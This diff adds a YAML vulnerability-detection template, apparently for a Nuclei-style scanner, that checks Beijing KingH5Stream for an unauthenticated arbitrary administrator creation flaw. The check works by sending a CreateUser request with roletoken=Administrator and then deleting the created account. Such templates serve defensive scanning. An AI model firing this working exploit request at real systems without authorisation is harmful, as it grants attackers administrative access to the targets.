@@ -1,0 +1,49 @@
+id: poc-yaml-kingh5stream-anyuser-create
+info:
+  name: Beijing KingH5Stream Arbitrary User Creation Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: auth-bypass
+  description: |
+    This template detects the arbitrary user creation vulnerability in Beijing KingH5Stream, allowing attackers to create users with administrative privileges.
+
+variables:
+  t1: "{{rand_base(5)}}"
+
+http:
+  - id: create-user
+    method: GET
+    path:
+      - "{{BaseURL}}/api/v1/CreateUser?user={{t1}}&password=cc03e747a6afbbcbf8be7668acfebee5&roletoken=Administrator"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"bStatus\": true"
+          - "\"strCode\": \"CreateUser  successfully\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: delete-user
+    method: GET
+    path:
+      - "{{BaseURL}}/api/v1/DeleteUser?user={{t1}}&session="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "DeleteUser  successfully"
+      - type: word
+        part: header
+        words:
+          - "application/json"
